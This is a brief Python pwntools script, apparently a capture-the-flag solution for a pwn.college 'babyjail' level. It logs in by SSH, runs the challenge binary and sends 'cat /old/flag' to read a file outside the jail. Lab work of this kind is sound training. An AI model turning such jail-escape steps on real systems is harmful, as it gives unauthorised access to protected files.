from pwn import ssh,context
from time import sleep
s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key")
p=s.process(["vm","connect"])
sleep(1);p.recv()
p.sendline(b"/challenge/babyjail_level14")
sleep(1);p.recv()
p.sendline(b"cat /old/flag")
flag=p.recvuntil(b"}")
print(flag.decode())
p.close()